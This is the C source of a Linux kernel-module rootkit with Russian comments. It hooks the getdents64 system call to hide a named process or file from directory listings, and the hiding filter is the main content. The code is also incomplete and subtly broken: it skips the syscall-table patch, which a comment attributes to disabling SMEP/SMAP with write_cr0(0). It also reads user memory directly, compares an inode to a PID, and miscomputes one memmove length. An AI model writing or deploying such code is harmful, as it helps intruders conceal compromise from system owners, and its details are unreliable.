// rootkit_lkm.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/tcp.h>

#define HIDDEN_PID 9999
#define HIDDEN_NAME "secret_process"

MODULE_LICENSE("GPL");

// Оригинальный syscall
asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

// Наша замена
asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    int nread = original_getdents64(fd, dirent, count);
    struct linux_dirent64 *entry = (struct linux_dirent64 *)dirent;
    struct linux_dirent64 *prev_entry = NULL;
    int bytes_left = nread;

    while (bytes_left > 0) {
        if (strcmp(entry->d_name, HIDDEN_NAME) == 0 ||
            entry->d_ino == HIDDEN_PID) {
            // Удаляем из списка
            if (prev_entry) {
                char *prev_end = (char *)prev_entry + prev_entry->d_reclen;
                char *curr_end = (char *)entry + entry->d_reclen;
                memmove(prev_end, curr_end, bytes_left - (prev_end - (char *)dirent));
                nread -= entry->d_reclen;
            } else {
                char *curr_end = (char *)entry + entry->d_reclen;
                memmove(entry, curr_end, bytes_left - (char *)entry - entry->d_reclen);
                nread -= entry->d_reclen;
            }
            break;
        }
        prev_entry = entry;
        bytes_left -= entry->d_reclen;
        entry = (struct linux_dirent64 *)((char *)entry + entry->d_reclen);
    }

    return nread;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    original_getdents64 = (void *)kallsyms_lookup_name("sys_getdents64");
    if (!original_getdents64) {
        printk(KERN_ERR "Не удалось найти sys_getdents64\n");
        return -1;
    }
    // Здесь нужно подменить таблицу syscalls (требует отключение защиты)
    // Пример упрощён — в реальности нужно отключить SMEP/SMAP, использовать write_cr0(0)
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);